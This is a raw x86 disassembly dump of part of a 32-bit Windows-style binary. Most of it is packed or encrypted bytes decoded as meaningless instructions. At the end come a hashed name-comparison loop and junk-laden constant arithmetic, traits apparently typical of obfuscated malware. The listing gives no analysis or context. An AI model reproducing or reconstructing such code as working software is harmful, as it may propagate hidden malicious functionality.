  41a772:	or     al,0xc1
  41a774:	and    DWORD PTR [edi],ecx
  41a776:	fistp  WORD PTR [eax]
  41a778:	and    al,0x64
  41a77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a77b:	out    0xd3,al
  41a77d:	(bad)  
  41a77e:	or     eax,0x8c7837be
  41a783:	dec    ebx
  41a784:	inc    ebx
  41a785:	fwait
  41a786:	xchg   ecx,eax
  41a787:	jmp    0xc85409c0
  41a78c:	add    BYTE PTR [ebx],dl
  41a78e:	xor    DWORD PTR [edi+0x34d88fd7],ecx
  41a794:	rcl    BYTE PTR [edi-0x6723f58],0x21
  41a79b:	xchg   edx,eax
  41a79c:	and    bh,dl
  41a79e:	ins    DWORD PTR es:[edi],dx
  41a79f:	stos   DWORD PTR es:[edi],eax
  41a7a0:	out    0x6f,eax
  41a7a2:	sub    BYTE PTR [ecx-0x6e],dh
  41a7a5:	(bad)  [ecx+0x12b4b1fc]
  41a7ab:	mov    dh,bl
  41a7ad:	add    bl,BYTE PTR [ecx+edx*4-0x7c98326b]
  41a7b4:	(bad)  
  41a7b5:	pushf  
  41a7b6:	in     al,0x9f
  41a7b8:	stos   DWORD PTR es:[edi],eax
  41a7b9:	cmp    eax,DWORD PTR [eax]
  41a7bb:	ss je  0x41a75b
  41a7be:	bound  ecx,QWORD PTR [ebx+esi*1-0x2a436f87]
  41a7c5:	mov    ah,BYTE PTR [edi+0x2b1c9a1d]
  41a7cb:	imul   BYTE PTR [ecx+0x30f14c7c]
  41a7d1:	loopne 0x41a7f1
  41a7d3:	xchg   ebp,eax
  41a7d4:	dec    esi
  41a7d5:	(bad)  
  41a7d6:	icebp  
  41a7d7:	sub    eax,0x884a9164
  41a7dc:	inc    edi
  41a7dd:	xchg   esp,eax
  41a7de:	or     DWORD PTR [ebx+0x727d394c],ebp
  41a7e4:	xchg   ecx,eax
  41a7e5:	in     eax,0x1c
  41a7e7:	mov    dh,0x84
  41a7e9:	outs   dx,DWORD PTR ds:[esi]
  41a7ea:	mov    ebp,0xf247f31
  41a7ef:	pop    esi
  41a7f0:	(bad)  
  41a7f1:	fcomip st,st(5)
  41a7f3:	ins    DWORD PTR es:[edi],dx
  41a7f4:	pop    esi
  41a7f5:	xor    DWORD PTR [ecx],eax
  41a7f7:	xchg   esp,eax
  41a7f8:	icebp  
  41a7f9:	add    BYTE PTR [edi],ah
  41a7fb:	sar    BYTE PTR [eax+0x8],1
  41a7fe:	and    al,0x7f
  41a800:	mov    eax,ds:0x6988772d
  41a805:	mov    eax,edi
  41a807:	mov    eax,0xe4b11ffc
  41a80c:	inc    esp
  41a80d:	mov    ds:0x79a77d5d,al
  41a812:	jle    0x41a86d
  41a814:	cld    
  41a815:	add    BYTE PTR [edi-0x3d],dh
  41a818:	fbstp  TBYTE PTR [ecx+0x1a]
  41a81b:	hlt    
  41a81c:	fld    DWORD PTR [ecx+edx*8]
  41a81f:	sar    bl,1
  41a821:	ficom  DWORD PTR [edi]
  41a823:	in     al,dx
  41a824:	in     eax,0x4e
  41a826:	test   DWORD PTR [esi+ebp*2-0xe],eax
  41a82a:	hlt    
  41a82b:	test   eax,0x8061f758
  41a830:	inc    esi
  41a831:	les    eax,FWORD PTR [edi]
  41a833:	pop    esp
  41a834:	push   0xa39d0828
  41a839:	ins    DWORD PTR es:[edi],dx
  41a83a:	fdivr  QWORD PTR [ecx+0x7110a30a]
  41a840:	cmc    
  41a841:	out    dx,al
  41a842:	and    esi,DWORD PTR [edi-0x67]
  41a845:	mov    bl,0xe3
  41a847:	pcmpgtw mm3,mm5
  41a84a:	clc    
  41a84b:	mov    DWORD PTR [ecx*2+0x1b22cb43],ebp
  41a852:	imul   BYTE PTR [ecx+0x616e3672]
  41a858:	mov    bh,0xe6
  41a85a:	sbb    bl,BYTE PTR [ebx+0x5297e30a]
  41a860:	mov    al,ds:0xc190b87
  41a865:	sbb    eax,0x2c94f939
  41a86a:	imul   edi,edx,0x6d
  41a86d:	pop    esp
  41a86e:	in     al,0xb9
  41a870:	not    DWORD PTR [edi]
  41a872:	std    
  41a873:	iret   
  41a874:	in     al,dx
  41a875:	repz mov ?,WORD PTR ds:[esi+0x61]
  41a87a:	dec    ebp
  41a87b:	fistp  QWORD PTR [ebx]
  41a87d:	mov    ?,WORD PTR ds:0x6d66a8d3
  41a883:	mov    esi,0x448f3f32
  41a888:	lea    ecx,[esi+ecx*8-0x21]
  41a88c:	aaa    
  41a88d:	push   ecx
  41a88e:	ret    
  41a88f:	in     al,dx
  41a890:	cmc    
  41a891:	je     0x41a8a9
  41a893:	sbb    DWORD PTR [edi+0x2a],eax
  41a896:	sub    al,0xee
  41a898:	xchg   edi,eax
  41a899:	pop    edx
  41a89a:	fsubr  QWORD PTR [eax-0xc]
  41a89d:	xchg   ebp,eax
  41a89e:	das    
  41a89f:	in     al,0x9f
  41a8a1:	fs jo  0x41a887
  41a8a4:	dec    ecx
  41a8a5:	rol    ch,1
  41a8a7:	int3   
  41a8a8:	xor    eax,0xd23f1470
  41a8ad:	dec    ecx
  41a8ae:	mov    esi,0x73651153
  41a8b3:	loopne 0x41a848
  41a8b5:	mov    al,ds:0x5f40688b
  41a8ba:	call   0x18e4:0xecbdd611
  41a8c1:	jecxz  0x41a886
  41a8c3:	popa   
  41a8c4:	mov    dh,0x9b
  41a8c6:	jg     0x41a877
  41a8c8:	sbb    esi,DWORD PTR [edi]
  41a8ca:	out    0x1d,eax
  41a8cc:	sahf   
  41a8cd:	xor    BYTE PTR [edx+0x55671a93],bl
  41a8d3:	jle    0x41a91a
  41a8d5:	cdq    
  41a8d6:	aam    0x76
  41a8d8:	stos   BYTE PTR es:[edi],al
  41a8d9:	xchg   ebp,eax
  41a8da:	ins    BYTE PTR es:[edi],dx
  41a8db:	cmp    ebx,ebx
  41a8dd:	dec    esp
  41a8de:	mov    edx,0x13881b73
  41a8e3:	outs   dx,BYTE PTR ds:[esi]
  41a8e4:	mov    ?,edi
  41a8e6:	enter  0x214a,0x85
  41a8ea:	push   ss
  41a8eb:	int3   
  41a8ec:	inc    edi
  41a8ed:	inc    esp
  41a8ee:	xor    cl,cl
  41a8f0:	int    0xe0
  41a8f2:	jae    0x41a934
  41a8f4:	push   ebp
  41a8f5:	ja     0x41a880
  41a8f7:	fucomip st,st(1)
  41a8f9:	std    
  41a8fa:	push   edx
  41a8fb:	dec    ebx
  41a8fc:	sbb    DWORD PTR ds:0x22411d3c,esi
  41a902:	jns    0x41a94f
  41a904:	xor    eax,0x280d438f
  41a909:	add    DWORD PTR [edi],edi
  41a90b:	call   0x9153:0xf37c1a63
  41a912:	imul   esp,DWORD PTR [ebp+0x3b],0xffffffec
  41a916:	out    0x58,al
  41a918:	in     eax,0x2d
  41a91a:	sub    eax,0x96c511d8
  41a91f:	mov    ds:0xb80b8b3d,al
  41a924:	xlat   BYTE PTR ds:[ebx]
  41a925:	scas   eax,DWORD PTR es:[edi]
  41a926:	stc    
  41a927:	sbb    eax,0x871e07ec
  41a92c:	inc    esp
  41a92d:	jne    0x41a8ff
  41a92f:	rcl    esp,cl
  41a931:	push   ss
  41a932:	jge    0x41a929
  41a934:	setns  BYTE PTR [ebp+0x48]
  41a938:	xor    DWORD PTR [ebx-0x6b20024],edi
  41a93e:	icebp  
  41a93f:	(bad)  
  41a940:	mov    ds:0x6e1fd381,eax
  41a945:	js     0x41a8d2
  41a947:	cwde   
  41a948:	cmp    esp,ebx
  41a94a:	mov    ebx,cs
  41a94c:	bound  eax,QWORD PTR [eax-0x33]
  41a94f:	xor    BYTE PTR [esi+0x52363494],cl
  41a955:	and    edx,DWORD PTR [edi]
  41a957:	mov    al,ds:0xe53c278d
  41a95c:	mov    esi,0x6afa6da0
  41a961:	mov    ch,0x9b
  41a963:	lods   al,BYTE PTR ds:[esi]
  41a964:	inc    esp
  41a965:	pop    esp
  41a966:	cs mov edx,0xf739e4c8
  41a96c:	out    0x45,eax
  41a96e:	add    DWORD PTR [ecx+0x2e],ecx
  41a971:	xor    DWORD PTR [esi+0x24],0x90c6464c
  41a978:	inc    ecx
  41a979:	and    eax,0xc45fd98c
  41a97e:	xchg   BYTE PTR [ebx+0x9],cl
  41a981:	(bad)  
  41a982:	in     al,dx
  41a983:	(bad)  
  41a984:	push   0xf465c18d
  41a989:	lahf   
  41a98a:	test   eax,0x28da6ac9
  41a98f:	out    dx,al
  41a990:	xchg   esi,eax
  41a991:	ret    
  41a992:	retf   0xb75d
  41a995:	mov    eax,ds:0x3646a3cf
  41a99a:	and    esp,DWORD PTR [ebx+0x4f]
  41a99d:	icebp  
  41a99e:	ret    
  41a99f:	jecxz  0x41a956
  41a9a1:	int    0xb9
  41a9a3:	sub    al,0x14
  41a9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9a6:	sub    BYTE PTR [eax+0xbaf6738],ch
  41a9ac:	pop    edi
  41a9ad:	inc    edx
  41a9ae:	leave  
  41a9af:	xchg   DWORD PTR [ebp-0x4d02efbf],ebx
  41a9b5:	pushf  
  41a9b6:	jnp    0x41aa26
  41a9b8:	inc    edx
  41a9b9:	in     al,dx
  41a9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9bb:	sbb    al,0xde
  41a9bd:	test   BYTE PTR [esi+eiz*2+0x56b67288],dh
  41a9c4:	dec    ebp
  41a9c5:	pop    ebp
  41a9c6:	mul    DWORD PTR [ecx]
  41a9c8:	sbb    edx,esp
  41a9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9cb:	mov    dh,0x94
  41a9cd:	(bad)  
  41a9ce:	frstor [ecx-0x737fed7]
  41a9d4:	iret   
  41a9d5:	add    BYTE PTR [ebx+0xc],0x7
  41a9d9:	call   FWORD PTR [eax]
  41a9db:	or     ecx,eax
  41a9dd:	repz into 
  41a9df:	sub    BYTE PTR [eax-0x8],0x64
  41a9e3:	aam    0xb8
  41a9e5:	(bad)  
  41a9e6:	fsubr  st(6),st
  41a9e8:	pop    es
  41a9e9:	mov    bl,0x4d
  41a9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ec:	add    al,0xf0
  41a9ee:	add    bh,BYTE PTR [ebx-0x6049ce85]
  41a9f4:	ror    DWORD PTR [edx+0x24],1
  41a9f7:	popf   
  41a9f8:	arpl   di,di
  41a9fa:	or     ecx,DWORD PTR [eax+0x72de9fc1]
  41aa00:	jmp    0xcb539617
  41aa05:	push   edi
  41aa06:	sub    al,0xde
  41aa08:	jecxz  0x41aa7d
  41aa0a:	mov    cl,bh
  41aa0c:	in     al,0x96
  41aa0e:	push   esp
  41aa0f:	out    dx,eax
  41aa10:	sar    DWORD PTR [eax],cl
  41aa12:	pop    ecx
  41aa13:	lods   eax,DWORD PTR ds:[esi]
  41aa14:	jmp    0x41aa72
  41aa16:	inc    ebp
  41aa17:	test   esp,esi
  41aa19:	dec    ecx
  41aa1a:	ss scas al,BYTE PTR es:[edi]
  41aa1c:	(bad)  [ecx]
  41aa1e:	sahf   
  41aa1f:	sub    BYTE PTR ds:0x5da82865,cl
  41aa25:	mov    ebx,DWORD PTR ds:0xc45d2321
  41aa2b:	xor    DWORD PTR [ebx-0x2acb0ae6],0x639df066
  41aa35:	cmp    al,0xdd
  41aa37:	cmp    cl,ah
  41aa39:	mov    esp,0xcf128726
  41aa3e:	xor    eax,0x3e17fd9f
  41aa43:	test   BYTE PTR [eax-0x61adc8b],bh
  41aa49:	arpl   WORD PTR [ebx+edi*8-0x7f],ax
  41aa4d:	jl     0x41a9f5
  41aa4f:	arpl   WORD PTR [esp+edi*2-0x19c74894],bp
  41aa56:	sahf   
  41aa57:	pop    eax
  41aa58:	jmp    0xee3f4a5e
  41aa5d:	enter  0x34ef,0xfa
  41aa61:	arpl   WORD PTR [ebx],bx
  41aa63:	out    0x26,al
  41aa65:	xchg   esp,eax
  41aa66:	repz pop ebp
  41aa68:	or     edi,ebx
  41aa6a:	pop    eax
  41aa6b:	ja     0x41aaa7
  41aa6d:	ret    0x82ba
  41aa70:	adc    cl,BYTE PTR [ecx+0x3f541a3a]
  41aa76:	xchg   edi,esp
  41aa78:	pop    esi
  41aa79:	jb     0x41aa53
  41aa7b:	or     ch,BYTE PTR [eax-0x5c]
  41aa7e:	(bad)  
  41aa7f:	adc    al,0x39
  41aa81:	aas    
  41aa82:	jmp    0x41aa5f
  41aa84:	out    0xb,eax
  41aa86:	adc    esp,edx
  41aa88:	fst    DWORD PTR [esi+0x4]
  41aa8b:	scas   al,BYTE PTR es:[edi]
  41aa8c:	sbb    BYTE PTR [eax+0x38],bh
  41aa8f:	into   
  41aa90:	sub    DWORD PTR [eax-0x6d],ecx
  41aa93:	push   ebx
  41aa94:	inc    eax
  41aa95:	outs   dx,BYTE PTR ds:[esi]
  41aa96:	(bad)  
  41aa97:	cli    
  41aa98:	pop    ebx
  41aa99:	mov    ds:0xc966048e,al
  41aa9e:	push   ebp
  41aa9f:	inc    eax
  41aaa0:	fisubr WORD PTR [edi+0x61]
  41aaa3:	pop    ebp
  41aaa4:	hlt    
  41aaa5:	push   ss
  41aaa6:	ja     0x41ab00
  41aaa8:	mov    dl,0x98
  41aaaa:	loopne 0x41aadd
  41aaac:	cli    
  41aaad:	test   BYTE PTR [edx],0x98
  41aab0:	cmp    DWORD PTR [ecx+0x6838ab7b],ebp
  41aab6:	jmp    0x41ab28
  41aab8:	add    eax,0xbfc5acfb
  41aabd:	cmp    ah,0xfb
  41aac0:	js     0x41aa50
  41aac2:	or     dh,BYTE PTR [esi+0x4ad1b2b4]
  41aac8:	sti    
  41aac9:	out    0xc8,al
  41aacb:	bnd jne 0x41ab20
  41aace:	cli    
  41aacf:	or     DWORD PTR [esi-0x1ea80585],esi
  41aad5:	(bad)  
  41aad6:	pop    ds
  41aad7:	and    eax,0x59fa3b14
  41aadc:	es mov ecx,0xe239049e
  41aae2:	inc    ebp
  41aae3:	cmp    DWORD PTR [ebp+0x2b32f3f9],esp
  41aae9:	paddw  mm7,QWORD PTR [edx]
  41aaec:	cdq    
  41aaed:	cmp    eax,0x5ab468d5
  41aaf2:	push   ebp
  41aaf3:	lods   eax,DWORD PTR ds:[esi]
  41aaf4:	outs   dx,DWORD PTR ds:[esi]
  41aaf5:	hlt    
  41aaf6:	into   
  41aaf7:	loopne 0x41aac8
  41aaf9:	imul   esi,DWORD PTR [eax-0x14c91f74],0x410d9b3c
  41ab03:	xor    eax,0x25f1ce4c
  41ab08:	cmp    eax,0x63fcca99
  41ab0d:	mov    ch,BYTE PTR [ecx]
  41ab0f:	es cli 
  41ab11:	and    BYTE PTR [ecx-0x75a14a6c],dh
  41ab17:	jl     0x41aaa9
  41ab19:	sahf   
  41ab1a:	out    0xae,al
  41ab1c:	pusha  
  41ab1d:	inc    edi
  41ab1e:	or     ah,ah
  41ab20:	or     ebp,DWORD PTR [edx+0x21]
  41ab23:	js     0x41ab41
  41ab25:	inc    edx
  41ab26:	retf   
  41ab27:	lods   al,BYTE PTR ds:[esi]
  41ab28:	inc    edx
  41ab29:	inc    ebx
  41ab2a:	daa    
  41ab2b:	cmp    BYTE PTR [eax],dh
  41ab2d:	test   BYTE PTR [esi],0x65
  41ab30:	xchg   esp,eax
  41ab31:	outs   dx,BYTE PTR ds:[esi]
  41ab32:	xor    cl,BYTE PTR [ecx]
  41ab34:	mov    al,ds:0xac13e88d
  41ab39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab3a:	dec    ecx
  41ab3b:	push   edx
  41ab3c:	mul    BYTE PTR [ebx]
  41ab3e:	test   eax,0x4ba8e916
  41ab43:	ds mov edx,0x1906bb8
  41ab49:	cdq    
  41ab4a:	shr    BYTE PTR [ecx-0x190a38a8],0x6e
  41ab51:	mov    cl,BYTE PTR [ebx-0x5f5969f3]
  41ab57:	or     al,0x8a
  41ab59:	fsub   QWORD PTR ds:[esi]
  41ab5c:	loopne 0x41ab33
  41ab5e:	sub    bl,ah
  41ab60:	in     eax,dx
  41ab61:	xor    BYTE PTR [ebx],bh
  41ab63:	cdq    
  41ab64:	jo     0x41abd4
  41ab66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab67:	ss inc esp
  41ab69:	dec    ecx
  41ab6a:	ins    BYTE PTR es:[edi],dx
  41ab6b:	sub    eax,0x5bdf564
  41ab70:	or     eax,0x52ba6d8a
  41ab75:	push   ebp
  41ab76:	arpl   WORD PTR [eax],bp
  41ab78:	mov    edi,0x6772fb4
  41ab7d:	inc    esi
  41ab7e:	add    dl,bh
  41ab80:	dec    ebp
  41ab81:	jmp    0x41abe6
  41ab83:	leave  
  41ab84:	popa   
  41ab85:	data16 (bad) 
  41ab87:	in     eax,dx
  41ab88:	fldcw  WORD PTR [edx-0x6340ad69]
  41ab8e:	out    dx,al
  41ab8f:	jbe    0x41ab9f
  41ab91:	cli    
  41ab92:	loop   0x41ab23
  41ab94:	adc    eax,0x1a29648a
  41ab99:	inc    esi
  41ab9a:	in     al,dx
  41ab9b:	push   0x3d
  41ab9d:	out    0x30,al
  41ab9f:	lea    ecx,[ecx+0x2]
  41aba2:	jbe    0x41ab64
  41aba4:	mov    ds:0xcceba300,al
  41aba9:	imul   esi,DWORD PTR [ebx+0x20d453ae],0xe11b83fa
  41abb3:	js     0x41ab3e
  41abb5:	or     eax,0x3e332c83
  41abba:	scas   eax,DWORD PTR es:[edi]
  41abbb:	pop    edx
  41abbc:	sbb    BYTE PTR [eax-0x2c],al
  41abbf:	icebp  
  41abc0:	push   0x88ed7ddb
  41abc5:	jecxz  0x41ab84
  41abc7:	sub    ch,BYTE PTR [esi+0x21]
  41abca:	mov    esi,0x3e49104d
  41abcf:	jmp    0xdb4c:0xfd5ce6c5
  41abd6:	dec    esp
  41abd7:	(bad)  
  41abd8:	ja     0x41ab68
  41abda:	test   DWORD PTR [ecx+ecx*2],0x32b82a8
  41abe1:	xchg   ecx,eax
  41abe2:	pop    DWORD PTR [ebx]
  41abe4:	and    BYTE PTR [ebp+0x6d1ea48c],cl
  41abea:	dec    esp
  41abeb:	xor    dh,al
  41abed:	mov    BYTE PTR [ecx+ebp*8+0x7b55201b],ch
  41abf4:	nop
  41abf5:	fst    QWORD PTR [edx-0xa0e9739]
  41abfb:	mov    ebx,0xa953fffb
  41ac00:	gs mov al,0xf0
  41ac03:	jle    0x41abb2
  41ac05:	and    BYTE PTR [esi],dl
  41ac07:	rcr    BYTE PTR cs:[ecx+0x7e],cl
  41ac0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac0c:	push   ecx
  41ac0d:	cmp    ecx,edx
  41ac0f:	or     DWORD PTR [eax],ebx
  41ac11:	jb     0x41ab9a
  41ac13:	ret    0xbe5a
  41ac16:	cmp    BYTE PTR [ecx-0x2],bh
  41ac19:	fild   DWORD PTR [eax+0x42adfa66]
  41ac1f:	pop    ss
  41ac20:	and    edi,DWORD PTR [ebp+0x56]
  41ac23:	add    eax,0xba2e2f7b
  41ac28:	in     eax,dx
  41ac29:	add    DWORD PTR [esi-0x553eb5e6],esp
  41ac2f:	push   ds
  41ac30:	mov    BYTE PTR [eax-0x62],dh
  41ac33:	mov    eax,ds:0xa42a3c00
  41ac38:	rol    DWORD PTR [edx+0x11d4f560],1
  41ac3e:	mov    BYTE PTR [ecx],ah
  41ac40:	sub    BYTE PTR [ebp+0x51a5e958],bl
  41ac46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac47:	adc    edi,DWORD PTR [edi+0x35ef698e]
  41ac4d:	stc    
  41ac4e:	pminub mm2,QWORD PTR [ebp-0x62]
  41ac52:	hlt    
  41ac53:	cdq    
  41ac54:	inc    eax
  41ac55:	sahf   
  41ac56:	or     BYTE PTR [ecx],bh
  41ac58:	mov    al,ds:0x1dc571ef
  41ac5d:	ret    
  41ac5e:	push   es
  41ac5f:	and    dh,BYTE PTR [ebp+edx*4-0x77]
  41ac63:	gs std 
  41ac65:	push   ds
  41ac66:	lods   eax,DWORD PTR ds:[esi]
  41ac67:	div    BYTE PTR [edx]
  41ac69:	arpl   WORD PTR [ebp-0x29abd148],cx
  41ac6f:	not    BYTE PTR [edi+0x72]
  41ac72:	cmp    al,0xfe
  41ac74:	pop    eax
  41ac75:	dec    edi
  41ac76:	mov    edi,0x4ef64d3e
  41ac7b:	test   eax,0xfff1ca5e
  41ac80:	xchg   edx,eax
  41ac81:	cmp    eax,0xccb23c46
  41ac86:	cld    
  41ac87:	adc    dl,BYTE PTR [edx-0x54]
  41ac8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac8b:	fnstsw WORD PTR [edi]
  41ac8d:	loope  0x41ac21
  41ac8f:	dec    ecx
  41ac90:	cld    
  41ac91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac92:	jno    0x41acce
  41ac94:	in     eax,0x2e
  41ac96:	jns    0x41ac72
  41ac98:	retf   0x6b26
  41ac9b:	cs jno 0x41acc4
  41ac9e:	sub    ch,cl
  41aca0:	dec    edx
  41aca1:	push   ebp
  41aca2:	rcr    BYTE PTR [edx+0xa0a10fc],1
  41aca8:	jae    0x41acce
  41acaa:	int3   
  41acab:	pop    esp
  41acac:	or     al,0xcb
  41acae:	mov    eax,0xddc7e3ad
  41acb3:	or     DWORD PTR [eax-0x4b40444a],ebp
  41acb9:	jno    0x41ad04
  41acbb:	les    esp,FWORD PTR [ebp-0x7a]
  41acbe:	(bad)  
  41acbf:	cmp    bl,ch
  41acc1:	push   0xc6ea825
  41acc6:	pop    ss
  41acc7:	mov    dh,0xe1
  41acc9:	jae    0x41ac96
  41accb:	pop    esi
  41accc:	inc    ebp
  41accd:	test   eax,0xd8861cac
  41acd2:	and    eax,0x85f474a5
  41acd7:	hlt    
  41acd8:	or     ch,BYTE PTR [ebx+0x3a52ab72]
  41acde:	dec    eax
  41acdf:	aam    0x2b
  41ace1:	or     eax,0xb4023efa
  41ace6:	cld    
  41ace7:	adc    eax,0x2332750d
  41acec:	pop    ecx
  41aced:	cmp    BYTE PTR [ebx],ch
  41acef:	stos   BYTE PTR es:[edi],al
  41acf0:	and    bl,BYTE PTR [edx+0x4fda7a1]
  41acf6:	add    eax,0xdfa3e28b
  41acfb:	fsub   DWORD PTR [eax+0x1a8f1c57]
  41ad01:	sbb    BYTE PTR [esi-0x42ba0413],0x8d
  41ad08:	stos   DWORD PTR es:[edi],eax
  41ad09:	pushf  
  41ad0a:	push   esi
  41ad0b:	xor    eax,0xdc7e812d
  41ad10:	mov    ebx,0xc96b32d
  41ad15:	sahf   
  41ad16:	dec    ebx
  41ad17:	sub    ebx,DWORD PTR [edi+edi*4]
  41ad1a:	inc    eax
  41ad1b:	inc    ebp
  41ad1c:	jnp    0x41ad0d
  41ad1e:	ja     0x41acc8
  41ad20:	loopne 0x41ad89
  41ad22:	loope  0x41ad6c
  41ad24:	dec    edx
  41ad25:	xor    dl,BYTE PTR [edi+0x5e]
  41ad28:	out    dx,al
  41ad29:	sbb    BYTE PTR [ebx],dh
  41ad2b:	retf   0x7e85
  41ad2e:	lock xor dl,BYTE PTR [ebx]
  41ad31:	add    dh,BYTE PTR [eax]
  41ad33:	fist   WORD PTR [eax]
  41ad35:	pop    ebx
  41ad36:	xor    al,0xb0
  41ad38:	jns    0x41ad6a
  41ad3a:	daa    
  41ad3b:	clc    
  41ad3c:	jmp    0x460cbab9
  41ad41:	and    BYTE PTR [eax],ch
  41ad43:	and    al,0xc8
  41ad45:	add    ebx,DWORD PTR ds:[esi+edi*1]
  41ad49:	sahf   
  41ad4a:	mov    DWORD PTR [edi+0x6e],esp
  41ad4d:	nop
  41ad4e:	test   ecx,ecx
  41ad50:	xchg   ebx,eax
  41ad51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad52:	ds (bad) 
  41ad54:	sbb    bl,BYTE PTR [edi]
  41ad56:	xor    al,0x92
  41ad58:	out    dx,al
  41ad59:	aaa    
  41ad5a:	pop    ds
  41ad5b:	dec    esi
  41ad5c:	cmp    ah,ah
  41ad5e:	add    DWORD PTR [edx],edx
  41ad60:	addr16 sbb cl,dh
  41ad63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad64:	mov    ebx,DWORD PTR [edx-0x726a26be]
  41ad6a:	outs   dx,DWORD PTR ds:[esi]
  41ad6b:	fdiv   QWORD PTR [ecx]
  41ad6d:	sbb    eax,0x1228f6f5
  41ad72:	(bad)  
  41ad74:	scas   al,BYTE PTR es:[edi]
  41ad75:	iret   
  41ad76:	hlt    
  41ad77:	xor    ebp,DWORD PTR [ebx-0x67]
  41ad7a:	ror    edx,0x46
  41ad7d:	test   DWORD PTR cs:[edi-0x6fedffbe],ebx
  41ad84:	(bad)  
  41ad85:	out    0x62,eax
  41ad87:	in     eax,dx
  41ad88:	jecxz  0x41ad51
  41ad8a:	pop    ebp
  41ad8b:	sub    dh,BYTE PTR [ebp+0x24]
  41ad8e:	lahf   
  41ad8f:	inc    edx
  41ad90:	(bad)  
  41ad91:	mov    eax,ds:0xf29b3c57
  41ad96:	jmp    0x3134:0xcce26aec
  41ad9d:	mov    ecx,0x3680e33d
  41ada2:	ja     0x41ad82
  41ada4:	cmp    al,BYTE PTR ds:0xcfae992e
  41adaa:	add    BYTE PTR [ebx+eiz*4+0x4c],al
  41adae:	(bad)  
  41adaf:	clc    
  41adb0:	ret    0x63b3
  41adb3:	call   0x5ec:0xbece7e5
  41adba:	cmp    al,0x55
  41adbc:	gs sub eax,0xca48d49a
  41adc2:	jno    0x41adbe
  41adc4:	retf   
  41adc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adc6:	out    0xce,al
  41adc8:	or     ah,BYTE PTR [edx]
  41adca:	retf   0xdd2b
  41adcd:	aas    
  41adce:	xor    BYTE PTR [ebp+ebx*1+0x16e13c1a],ch
  41add5:	jmp    0x41ad8a
  41add7:	lds    ebx,FWORD PTR [eax+eax*4+0x393c32d6]
  41adde:	shr    BYTE PTR [esi-0x6f],1
  41ade1:	sar    BYTE PTR [edx],cl
  41ade3:	out    dx,al
  41ade4:	pop    ss
  41ade5:	hlt    
  41ade6:	mov    cl,0xac
  41ade8:	in     eax,dx
  41ade9:	push   ecx
  41adea:	enter  0x8984,0x45
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c66
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
